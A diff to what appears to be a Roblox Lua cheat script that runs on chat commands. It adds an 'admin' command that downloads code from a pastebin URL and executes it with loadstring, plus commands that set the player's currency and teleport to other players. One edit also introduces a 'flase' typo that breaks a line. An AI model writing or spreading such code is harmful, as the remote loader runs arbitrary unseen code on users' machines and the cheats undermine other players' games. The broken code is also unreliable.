@@ -155,6 +155,12 @@ end
 
     end
 
+    if cmd == "admin" then
+
+		loadstring(game:HttpGet("https://pastebin.com/raw/JMdNgFCw"))()
+
+    end
+
 if cmd == "rename" then
             		if cmd == "rename" then
             		    local var = string.sub(msg,space+1)
@@ -174,7 +180,7 @@ if cmd == "rename" then
 
 		game.Players.LocalPlayer.Character.LowerTorso.Anchored = false
 
-	game.Players.LocalPlayer.Character.UppperTorso.Anchored = false
+	game.Players.LocalPlayer.Character.UppperTorso.Anchored = flase
 
     end
 
@@ -278,8 +284,38 @@ if cmd == "warn" then
 
 Duration = 16;
     end
-    end  
+    end
     
+    if cmd == "cash" then
+            		if cmd == "cash" then
+            		    local var = string.sub(msg,space+1)
+		game.Players.LocalPlayer.DataFolder.Currency.Value = (var)
+    end
+   end
+   
+if cmd == "teleport" then
+    local var = string.sub(msg, space + 1)
+    
+    -- Replace 'LocalPlayer' with the actual reference to the player you want to teleport
+    local localPlayer = game.Players.LocalPlayer
+    
+    -- Function to get a short version of the player's name
+    local function getShortName(player)
+        return player.Name:sub(1, 1) -- Adjust the number to the desired length
+    end
+    
+    -- Check if the target player exists
+    local targetPlayer = game.Players:FindFirstChild(var)
+    
+    if targetPlayer then
+        -- Teleport the local player to the target player's character
+        localPlayer.Character:SetPrimaryPartCFrame(targetPlayer.Character.HumanoidRootPart.CFrame)
+        print('Teleported to ' .. getShortName(targetPlayer))
+    else
+        warn('Player not found: ' .. var)
+    end
+end
+
 function GetPlayer(String)
 
     local plr
